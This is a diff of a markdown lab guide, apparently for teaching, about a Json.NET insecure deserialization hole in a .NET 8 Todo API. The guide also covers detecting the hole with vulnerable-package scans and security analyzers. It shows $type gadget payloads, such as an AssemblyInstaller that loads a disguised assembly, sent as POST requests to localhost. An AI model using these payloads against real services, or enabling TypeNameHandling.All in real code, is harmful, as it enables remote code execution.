@@ -1,6 +1,6 @@
 # .NET 8 Json.NET Serialization Vulnerability
 
-Exploiting JSON serialization vulnerabilities in .NET is more challenging than in the .NET Framework. The .NET Framework gadget chains exploited by [ysoserial.net](https://github.com/pwntester/ysoserial.net) have been remediated in .NET. 
+Exploiting JSON serialization vulnerabilities in .NET is more challenging than in the .NET Framework. The .NET Framework gadget chains exploited by [ysoserial.net](https://github.com/pwntester/ysoserial.net) have been remediated in .NET.
 
 This exploit requires setting _TypeNameHandling_ to _TypeNameHandling.All_. System.Text.Json does not natively allow type names to be included in serialized messages and is recommended. Further, with .NET 6+ it is not possible to override the default JSON serializer from System.Text.Json when using minimal APIs. See [Minimal APIs quick reference](https://learn.microsoft.com/en-us/aspnet/core/fundamentals/minimal-apis?view=aspnetcore-8.0&WT.mc_id=MVP_337682#configure-json-deserialization-options-for-body-binding).
 
@@ -48,24 +48,26 @@ public class TodoItem
 
 This can be exploited using the following message:
 
-``` JSON
+``` json
 {
   "name": "walk dog1",
   "isComplete": true,
   "metadata":
     {
-        "data2": {
-		   "$type": "System.IO.FileInfo, System.IO.FileSystem",
-		   "fileName": "rce-test.txt"
-	     }
+        "data2": 
+        {
+          "$type": "System.IO.FileInfo, System.IO.FileSystem",
+          "fileName": "rce-test.txt"
+        }
     }
 }
 ```
+
 ## Load the malicious file
 
 The first REST API call loads the malicious file using:
 
-``` JSON
+``` json
 POST https://localhost:7040/api/TodoItems HTTP/1.1
 content-type: application/json
 
@@ -74,19 +76,22 @@ content-type: application/json
   "isComplete": true,
   "metadata":
     {
-        "data2":  {"$type":"System.Configuration.Install.AssemblyInstaller, 
+        "data2":
+        {
+          "$type":"System.Configuration.Install.AssemblyInstaller, 
             System.Configuration.Install",
-            "Path":"someimage.png"}
+          "Path":"someimage.png"}
     }
 }
 ```
+
 The _Path_ is local; however, in a production environment, it could be loaded from a temporary directory or another local directory.
 
 ## Invoke the Malicious Property
 
 Now that the Assembly is in the AppDomain, the ProcessLaunch property can be invoked:
 
-``` JSON 
+``` json
 POST https://localhost:7040/api/TodoItems HTTP/1.1
 content-type: application/json
 
@@ -116,11 +121,14 @@ Scan the solution for known vulnerabilities using `dotnet`.
 1. Navigate to the solution folder in a command prompt.
 
 1. Execute the following and observe the results.
-    ```
+
+    ``` bat
     dotnet list package --vulnerable
     ```
+
 1. Execute the a check for transitive dependencies and observe the results.
-    ```
+
+    ``` bat
     dotnet list package --vulnerable --include-transitive
     ```
 
@@ -131,19 +139,21 @@ For more information, please see:
 
 ### Code Analysis Rules
 
-Code Analysis Rules can be used to identify common security vulnerabilities and other issues. For more information, see [roslyn-analyzers](https://github.com/dotnet/roslyn-analyzers#microsoftcodeanalysisnetanalyzers).
+Code Analysis Rules can be used to identify common security vulnerabilities and other issues. For more information, see [roslyn-analyzers](https://github.com/dotnet/roslyn-analyzers#microsoftcodeanalysisnetanalyzers). Security rules are disabled by default. For a comprehensive list of security rules see [Security Warnings](https://learn.microsoft.com/en-us/dotnet/fundamentals/code-analysis/quality-rules/security-warnings?WT.mc_id=MVP_337682).
 
 1. Install the latest released [Microsoft.CodeAnalysis.NetAnalyzers](https://www.nuget.org/packages/Microsoft.CodeAnalysis.NetAnalyzers) Nuget package in the TodoApi.
 
-1. Open File Explorer and navigate to the .nuget installation directory and review the folders under: 
-    ```
+1. Open File Explorer and navigate to the .nuget installation directory and review the folders under:
+
+    ``` bat
     %USERPROFILE%\.nuget\packages\microsoft.codeanalysis.netanalyzers\8.0.0\editorconfig
     ```
-1. Copy the `.editorconfig` file in the `AllRulesDefault` folder to the solution folder. This is the same folder that contains the `.NET8-JsonVulnerabilties.sln` file. The `SecurityRulesEnabled\.editorconfig` folder includes security rules set to warning and all others set to none. Default rules includes security rules set to 
+
+1. Copy the `.editorconfig` file in the `AllRulesDefault` folder to the solution folder. This is the same folder that contains the `.NET8-JsonVulnerabilties.sln` file. The `SecurityRulesEnabled\.editorconfig` folder includes security rules set to warning and all others set to none. Security rules are disabled by default.
 
 1. In Visual Studio, right-click on the `Solution Items` folder and select `Add | Existing Item...`. Add the `.editorconfig` file from the solution root directory.
 
-1. Rebuild and observe the Warning messages returned in the 
+1. Rebuild and observe the Warning messages returned in the Error List.
 
     ![Observe Warnings](./images/serialization01.png "Observe Warnings")
 
@@ -173,5 +183,3 @@ Code Analysis Rules can be used to identify common security vulnerabilities and 
     [System.Diagnostics.CodeAnalysis.SuppressMessage("Security", "CA2326:Do not use TypeNameHandling values other than None", Justification = "Test class. This is not production code.")]
     public class JsonDeserialization
     ```
-
-
